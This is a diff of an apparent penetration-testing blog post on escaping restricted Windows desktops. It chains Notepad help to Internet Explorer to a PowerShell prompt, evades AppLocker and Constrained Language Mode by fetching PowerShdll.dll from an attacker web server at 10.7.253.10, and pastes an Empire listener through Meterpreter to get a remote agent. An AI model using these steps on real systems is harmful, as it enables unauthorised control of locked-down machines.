@@ -19,17 +19,27 @@ Learn more from the links at the bottom of this article.
 [https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
 
 From the notepad app  
-Click Help -&gt; View help -&gt; triggers Internet Explorer  
-Right click on anything -&gt; save target as -&gt; save as lol.ps1 on the Desktop  
-Press view downloads in IE, press the dropdown on the file, open with -&gt; notepad. then just write powershell.exe in the file and save again  
+Click Help -&gt; View help -&gt; triggers Internet Explorer
+
+![](/assets/viewhelp.png)
+
+  
+Right click on any link in IE -&gt; save target as -&gt; save as lol.ps1 on the Desktop
+
+![](/assets/lolps1.png)  
+Press view downloads in IE, press the dropdown on the file, open with -&gt; notepad. then just write powershell.exe in the file and save again
+
+  
 Now right click -&gt; "save target as" in IE again. Go to the dropdown "save as type" and select "all files". The ps1-file you have saved will be revealed and you can just press "run with powershell" and a powershell prompt should pop up. This shell should be in Constrained mode. Verify with `$ExecutionContext.SessionState.LanguageMode`, which should say `ConstrainedLanguage`.
+
+![](/assets/runwithps.png)
 
 #### Bypssing PoSh constrained mode
 
 Download PowerShdll from [https://github.com/p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll)  
 Host powershdll.dll on Kali web server using `python -m SimpleHTTPServer 80`  
 Navigate to the following URL in IE where [http://10.7.253.10/PowerShdll.dll](http://10.7.253.10/PowerShdll.dll)  
-Save as -&gt; PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. But navigating to folders might also be restricted, so in certain ocassions you might need to save to Desktop.
+Save as -&gt; PowerShdll.dll to whatever folder you like. `C:\Windows\Tasks` is generally nice to use when Applocker is installed because it is usually whitelisted. But navigating to folders might also be restricted, so in certain ocassions you might need to save to `C:\Users\Username\Desktop`![](/assets/dlpowershdll.png)
 
 I'm not sure exactly how to check for DLL rules in an Applocked environment yet.
 
@@ -97,8 +107,13 @@ load powershell
 powershell_shell
 ```
 
-Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire. Congratulations!  
+Copypaste the empire listener in the interactive shell, and an agent should spawn in Empire.
+
+![](/assets/powershell_shell.png)
+
 ![](/assets/empireagent.png)
+
+Congratulations!
 
 ## More advanced technique
 
